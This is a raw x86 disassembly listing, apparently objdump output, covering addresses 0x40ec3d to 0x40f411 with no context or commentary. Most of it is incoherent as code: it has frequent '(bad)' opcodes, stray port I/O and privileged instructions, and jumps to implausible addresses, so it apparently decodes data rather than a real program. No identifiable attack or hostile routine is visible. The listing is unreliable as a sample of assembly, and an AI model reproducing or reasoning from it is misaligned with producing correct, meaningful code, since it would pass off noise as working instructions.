  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
